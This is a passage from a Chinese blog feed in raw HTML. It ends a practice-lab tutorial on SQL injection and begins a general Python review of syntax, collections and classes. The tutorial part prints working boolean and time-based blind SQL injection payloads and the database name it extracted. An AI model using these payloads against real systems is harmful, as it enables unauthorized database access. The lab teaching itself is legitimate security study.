sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">test1<span class="hljs-string">&#x27; and ascii(substr(database(), 1, 1)) &gt; 105#   回显正常</span><br><span class="hljs-string">test1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">120</span>#   回显错误<br>test1<span class="hljs-string">&#x27; and ascii(substr(database(), 1, 1)) = 112#   回显正常</span><br></code></pre></td></tr></table></figure><p>112也就是p。</p><p>也可以直接跑，结果也是p。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328184536047.png" alt="image-20230328184536047"></p><p>设置两个注入点，就可以一次跑出来数据库的名字。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328185224224.png" alt="image-20230328185224224" style="zoom:50%;" /><p>1:112、2:105、3:107、4:97、5:99、6:104、7:117</p><p>p、i、k、a、c、h、u。</p><h2 id="9-盲注（基于time）"><a href="#9-盲注（基于time）" class="headerlink" title="9.盲注（基于time）"></a>9.盲注（基于time）</h2><p>通过if判断，正确休眠，错误查询。</p><p>例如payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">test1<span class="hljs-string">&#x27; and  if((substr(database(), 1, 1))=&#x27;</span>p<span class="hljs-string">&#x27;, sleep(5), null)#</span><br></code></pre></td></tr></table></figure><p>如果database的第一个字符为p就睡眠五秒，也可以设置少一点。</p><p>其他的和布尔盲注差别不大。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_52385170/article/details/128093840">https://blog.csdn.net/weixin_52385170/article/details/128093840</a></p><p><a href="https://www.freebuf.com/articles/web/256097.html">https://www.freebuf.com/articles/web/256097.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/398726175">https://zhuanlan.zhihu.com/p/398726175</a></p><p><a href="https://blog.csdn.net/qq_51789211/article/details/128677727">https://blog.csdn.net/qq_51789211/article/details/128677727</a></p><p><a href="https://www.freebuf.com/vuls/345056.html">https://www.freebuf.com/vuls/345056.html</a></p><p><a href="https://xz.aliyun.com/t/9849">https://xz.aliyun.com/t/9849</a></p><p><a href="http://imyhq.com/sec/1907.html">http://imyhq.com/sec/1907.html</a></p><p><a href="https://www.freebuf.com/articles/web/263555.html">https://www.freebuf.com/articles/web/263555.html</a></p><p>《图解http》</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>知识点简单整合</title>
    <link href="/2023/03/24/2023/%E8%BF%87%E5%8E%BB%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AE%80%E5%8D%95%E6%95%B4%E5%90%88/"/>
    <url>/2023/03/24/2023/%E8%BF%87%E5%8E%BB%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AE%80%E5%8D%95%E6%95%B4%E5%90%88/</url>
    
    <content type="html"><![CDATA[<p>复习和整合一下以前学过的知识吧。</p><p>好多都忘得七七八八了。</p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p><a href="https://github.com/jackfrued/Python-100-Days">python100day</a></p><p><strong>优点：简单、开源、免费、高级语言、解释型语言（跨平台）、面向对象编程、功能强大、扩展性强（胶水语言）</strong></p><p><strong>缺点：执行效率低，代码无法加密</strong></p><p>自带开发工具IDLE（用户体验不太好）</p><p>python之禅：import this</p><p>turtle画图：import turtle （原LOGO语言）</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>常见的数据类型：整型、浮点型、字符串型、布尔型、负数型</p><p><strong>变量命名规则</strong></p><ul><li>硬性规则：<ul><li>变量名由字母（广义的Unicode字符，不包括特殊字符）、数字和下划线构成，数字不能开头。</li><li>大小写敏感（大写的<code>a</code>和小写的<code>A</code>是两个不同的变量）。</li><li>不要跟关键字（有特殊含义的单词）和系统保留字（如函数、模块等的名字）冲突。</li></ul></li><li>PEP 8要求：<ul><li>用小写字母拼写，多个单词用下划线连接。</li><li>受保护的实例属性用单个下划线开头。</li><li>私有的实例属性用两个下划线开头。</li></ul></li></ul><p><strong>常用内置函数：</strong></p><ul><li><code>int()</code>：将一个数值或字符串转换成整数，可以指定进制。</li><li><code>float()</code>：将一个字符串转换成浮点数。</li><li><code>str()</code>：将指定的对象转换成字符串形式，可以指定编码。</li><li><code>chr()</code>：将整数转换成该编码对应的字符串（一个字符）。</li><li><code>ord()</code>：将字符串（一个字符）转换成对应的编码（整数）。</li></ul><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td><code>[]</code> <code>[:]</code></td><td>下标，切片</td></tr><tr><td><code>**</code></td><td>指数</td></tr><tr><td><code>~</code> <code>+</code> <code>-</code></td><td>按位取反, 正负号</td></tr><tr><td><code>*</code> <code>/</code> <code>%</code> <code>//</code></td><td>乘，除，模，整除</td></tr><tr><td><code>+</code> <code>-</code></td><td>加，减</td></tr><tr><td><code>&gt;&gt;</code> <code>&lt;&lt;</code></td><td>右移，左移</td></tr><tr><td><code>&amp;</code></td><td>按位与</td></tr><tr><td><code>^</code> &#96;</td><td>&#96;</td></tr><tr><td><code>&lt;=</code> <code>&lt;</code> <code>&gt;</code> <code>&gt;=</code></td><td>小于等于，小于，大于，大于等于</td></tr><tr><td><code>==</code> <code>!=</code></td><td>等于，不等于</td></tr><tr><td><code>is</code> <code>is not</code></td><td>身份运算符</td></tr><tr><td><code>in</code> <code>not in</code></td><td>成员运算符</td></tr><tr><td><code>not</code> <code>or</code> <code>and</code></td><td>逻辑运算符</td></tr><tr><td><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>//=</code> <code>**=</code> <code>&amp;=</code> &#96;</td><td>&#x3D;<code> </code>^&#x3D;<code> </code>&gt;&gt;&#x3D;<code> </code>&lt;&lt;&#x3D;&#96;</td></tr></tbody></table><p>比较运算符的优先级高于赋值运算符。</p><p>python不像C或者java使用花括号来构造代码块，而是通过缩进判断代码层次。</p><p><strong>分支结构：</strong></p><ul><li>if、elif、else</li></ul><p><strong>循环结构：</strong></p><ul><li>for-in</li><li>while</li></ul><p><strong>斐波那契数列（前20）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1 1 2 3 5 8 13 21 ...</span><br>a = <span class="hljs-number">0</span><br>b = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    a, b = b, a + b<br>    <span class="hljs-built_in">print</span>(a, end=<span class="hljs-string">&#x27; &#x27;</span>)<br></code></pre></td></tr></table></figure><p>定义函数：<strong>def</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Todo: Add your code here</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>案例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">roll_dice</span>(<span class="hljs-params">n=<span class="hljs-number">2</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;摇色子&quot;&quot;&quot;</span><br>    total = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        total += randint(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">return</span> total<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a=<span class="hljs-number">0</span>, b=<span class="hljs-number">0</span>, c=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;三个数相加&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> a + b + c<br><br><br><span class="hljs-comment"># 如果没有指定参数那么使用默认值摇两颗色子</span><br><span class="hljs-built_in">print</span>(roll_dice())<br><span class="hljs-comment"># 摇三颗色子</span><br><span class="hljs-built_in">print</span>(roll_dice(<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(add())<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))<br><span class="hljs-comment"># 传递参数时可以不按照设定的顺序进行传递</span><br><span class="hljs-built_in">print</span>(add(c=<span class="hljs-number">50</span>, a=<span class="hljs-number">100</span>, b=<span class="hljs-number">200</span>))<br><br><span class="hljs-comment">#################################################</span><br><br><span class="hljs-comment"># 在参数名前面的*表示args是一个可变参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">*args</span>):<br>    total = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> args:<br>        total += val<br>    <span class="hljs-keyword">return</span> total<br><br><span class="hljs-comment"># 在调用add函数时可以传入0个或多个参数</span><br><span class="hljs-built_in">print</span>(add())<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(add(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>))<br></code></pre></td></tr></table></figure><p>函数同名时，后面覆盖前面的。</p><p><strong>全局：global</strong></p><p>字符串：由零个或多个字符组成的有限序列，用单引号或双引号包围。</p><p>格式化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a, b = <span class="hljs-number">5</span>, <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%d * %d = %d&#x27;</span> % (a, b, a * b))<br><br><span class="hljs-comment">#字符串格式</span><br>a, b = <span class="hljs-number">5</span>, <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;0&#125; * &#123;1&#125; = &#123;2&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(a, b, a * b))<br><br><span class="hljs-comment">#python 3.6后的语法糖</span><br>a, b = <span class="hljs-number">5</span>, <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span> * <span class="hljs-subst">&#123;b&#125;</span> = <span class="hljs-subst">&#123;a * b&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">list1 = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">100</span>]<br><span class="hljs-comment"># 添加元素</span><br>list1.append(<span class="hljs-number">200</span>)<br>list1.insert(<span class="hljs-number">1</span>, <span class="hljs-number">400</span>)<br><span class="hljs-comment"># 合并两个列表</span><br><span class="hljs-comment"># list1.extend([1000, 2000])</span><br>list1 += [<span class="hljs-number">1000</span>, <span class="hljs-number">2000</span>]<br><span class="hljs-built_in">print</span>(list1) <span class="hljs-comment"># [1, 400, 3, 5, 7, 100, 200, 1000, 2000]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(list1)) <span class="hljs-comment"># 9</span><br><span class="hljs-comment"># 先通过成员运算判断元素是否在列表中，如果存在就删除该元素</span><br><span class="hljs-keyword">if</span> <span class="hljs-number">3</span> <span class="hljs-keyword">in</span> list1:<br>list1.remove(<span class="hljs-number">3</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-number">1234</span> <span class="hljs-keyword">in</span> list1:<br>    list1.remove(<span class="hljs-number">1234</span>)<br><span class="hljs-built_in">print</span>(list1) <span class="hljs-comment"># [1, 400, 5, 7, 100, 200, 1000, 2000]</span><br><span class="hljs-comment"># 从指定的位置删除元素</span><br>list1.pop(<span class="hljs-number">0</span>)<br>list1.pop(<span class="hljs-built_in">len</span>(list1) - <span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(list1) <span class="hljs-comment"># [400, 5, 7, 100, 200, 1000]</span><br><span class="hljs-comment"># 清空列表元素</span><br>list1.clear()<br><span class="hljs-built_in">print</span>(list1) <span class="hljs-comment"># []</span><br></code></pre></td></tr></table></figure><p><strong>生成式和生成器：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">f = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)]<br><span class="hljs-comment">#[1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br>f = [x + y <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDE&#x27;</span> <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;1234567&#x27;</span>]<br><span class="hljs-comment">#[&#x27;A1&#x27;, &#x27;A2&#x27;, &#x27;A3&#x27;, &#x27;A4&#x27;, &#x27;A5&#x27;, &#x27;A6&#x27;, &#x27;A7&#x27;, &#x27;B1&#x27;, &#x27;B2&#x27;, &#x27;B3&#x27;, &#x27;B4&#x27;, &#x27;B5&#x27;, &#x27;B6&#x27;, &#x27;B7&#x27;, &#x27;C1&#x27;, &#x27;C2&#x27;, &#x27;C3&#x27;, &#x27;C4&#x27;, &#x27;C5&#x27;, &#x27;C6&#x27;, &#x27;C7&#x27;, &#x27;D1&#x27;, &#x27;D2&#x27;, &#x27;D3&#x27;, &#x27;D4&#x27;, &#x27;D5&#x27;, &#x27;D6&#x27;, &#x27;D7&#x27;, &#x27;E1&#x27;, &#x27;E2&#x27;, &#x27;E3&#x27;, &#x27;E4&#x27;, &#x27;E5&#x27;, &#x27;E6&#x27;, &#x27;E7&#x27;]</span><br><br><span class="hljs-comment"># 请注意下面的代码创建的不是一个列表而是一个生成器对象</span><br><span class="hljs-comment"># 通过生成器可以获取到数据但它不占用额外的空间存储数据</span><br><span class="hljs-comment"># 每次需要数据的时候就通过内部的运算得到数据(需要花费额外的时间)</span><br>f = (x ** <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>))<br><span class="hljs-built_in">print</span>(sys.getsizeof(f))  <span class="hljs-comment"># 相比生成式生成器不占用存储数据的空间</span><br><span class="hljs-built_in">print</span>(f)<br><span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> f:<br>    <span class="hljs-built_in">print</span>(val)<br></code></pre></td></tr></table></figure><p>可用<a href="https://mp.weixin.qq.com/s?__biz=MzAxMjUyNDQ5OA==&mid=2653572316&idx=3&sn=b0cfb4f896bad5bdd301b4307f92246d&chksm=806e6261b719eb7714ea3bc7cd421b00076e99797c72981227c264f0682afd4c9e2ca2d4236f&scene=27">yield</a>关键字将普通函数改造成生成器函数（例：斐波那契）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fib</span>(<span class="hljs-params">n</span>):<br>    a, b = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        a, b = b, a + b<br>        <span class="hljs-keyword">yield</span> a<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> fib(<span class="hljs-number">20</span>):<br>        <span class="hljs-built_in">print</span>(val)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>元组：元组与列表类似也是一种容器数据类型，可以用一个变量（对象）来存储多个数据，不同之处在于元组的元素不能修改</p><p><strong>集合</strong>：集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。</p><p><img src="https://github.com/jackfrued/Python-100-Days/raw/master/Day01-15/res/python-set.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建集合的字面量语法</span><br>set1 = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>&#125;<br><span class="hljs-built_in">print</span>(set1) <span class="hljs-comment">#&#123;1,2,3&#125;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Length =&#x27;</span>, <span class="hljs-built_in">len</span>(set1)) <span class="hljs-comment"># 3</span><br><span class="hljs-comment"># 创建集合的构造器语法(面向对象部分会进行详细讲解)</span><br>set2 = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>))<br>set3 = <span class="hljs-built_in">set</span>((<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(set2, set3) <span class="hljs-comment">#&#123;1, 2, 3, 4, 5, 6, 7, 8, 9&#125; &#123;1, 2, 3&#125;</span><br><span class="hljs-comment"># 创建集合的推导式语法(推导式也可以用于推导集合)</span><br>set4 = &#123;num <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>) <span class="hljs-keyword">if</span> num % <span class="hljs-number">3</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> num % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>&#125;<br><span class="hljs-built_in">print</span>(set4)<br><span class="hljs-comment">#&#123;3, 5, 6, 9, 10, 12, 15, 18, 20, 21, 24, 25, 27, 30, 33, 35, 36, 39, 40, 42, 45, 48, 50, 51, 54, 55, 57, 60, 63, 65, 66, 69, 70, 72, 75, 78, 80, 81, 84, 85, 87, 90, 93, 95, 96, 99&#125;</span><br></code></pre></td></tr></table></figure><p>字典：可以存储任意类型对象，与列表、集合不同的是，字典的每个元素都是由一个键和一个值组成的“键值对”，键和值通过冒号分开。</p><hr><p>定义类：class</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-comment"># __init__是一个特殊方法用于在创建对象时进行初始化操作</span><br>    <span class="hljs-comment"># 通过这个方法我们可以为学生对象绑定name和age两个属性</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">study</span>(<span class="hljs-params">self, course_name</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s正在学习%s.&#x27;</span> % (self.name, course_name))<br></code></pre></td></tr></table></figure><p>在Python中，属性和方法的<strong>访问权限有三种</strong>，也就是<strong>公开的、受保护的和私有的</strong>。</p><p>如果希望属性是<strong>私有</strong>属性，在给属性命名时可以用两个下划线__作为开头。私有变量<strong>只能在本类的内部直接调用</strong>，若想间接调用，可**<code>._类名__私有变量</code>**进行调用。</p><p>若是受保护的，一个下划线_作为开头。但总的来说，和公共变量差别不大。</p><p>本质上，python没有真正意义上的私有，仍可以在外部访问私有属性和私有方法，所以是相对私有。</p><hr><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><p>继承、封装、多态。</p><h4 id="property装饰器"><a href="#property装饰器" class="headerlink" title="@property装饰器"></a>@property装饰器</h4><blockquote><p>虽然不建议将属性设置为私有的，但直接将属性暴露给外界也是有问题的。</p><p>比如我们没有办法检查赋给属性的值是否有效。</p><p>我们之前的建议是将属性命名以单下划线开头，通过这种方式来暗示属性是受保护的，不建议外界直接访问，那么如果想访问属性可以通过属性的getter（访问器）和setter（修改器）方法进行对应的操作。</p><p>如果要做到这点，就可以考虑使用@property包装器来包装getter和setter方法，使得对属性的访问既安全又方便，代码如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self._name = name<br>        self._age = age<br><br>    <span class="hljs-comment"># 访问器 - getter方法</span><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._name<br><br>    <span class="hljs-comment"># 访问器 - getter方法</span><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._age<br><br>    <span class="hljs-comment"># 修改器 - setter方法</span><br><span class="hljs-meta">    @age.setter</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self, age</span>):<br>        self._age = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">play</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self._age &lt;= <span class="hljs-number">16</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s正在玩飞行棋.&#x27;</span> % self._name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s正在玩斗地主.&#x27;</span> % self._name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    person = Person(<span class="hljs-string">&#x27;王大锤&#x27;</span>, <span class="hljs-number">12</span>)<br>    person.play()<br>    person.age = <span class="hljs-number">22</span><br>    person.play()<br>    <span class="hljs-comment"># person.name = &#x27;白元芳&#x27;  # AttributeError: can&#x27;t set attribute</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure></blockquote><h4 id="slots-魔法"><a href="#slots-魔法" class="headerlink" title="__slots__魔法"></a><strong>__slots__魔法</strong></h4><blockquote><p>Python是一门<a href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E8%AF%AD%E8%A8%80">动态语言</a>。</p><p>通常，动态语言允许我们在程序运行时给对象绑定新的属性或方法，当然也可以对已经绑定的属性和方法进行解绑定。</p><p>但是如果我们需要限定自定义类型的对象只能绑定某些属性，可以通过在类中定义__slots__变量来进行限定。</p><p>需要注意的是__slots__的限定只对当前类的对象生效，对子类并不起任何作用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-comment"># 限定Person对象只能绑定_name, _age和_gender属性</span><br>    __slots__ = (<span class="hljs-string">&#x27;_name&#x27;</span>, <span class="hljs-string">&#x27;_age&#x27;</span>, <span class="hljs-string">&#x27;_gender&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self._name = name<br>        self._age = age<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._name<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._age<br><br><span class="hljs-meta">    @age.setter</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self, age</span>):<br>        self._age = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">play</span>(<span class="hljs-params">self</span>):<br>        <span 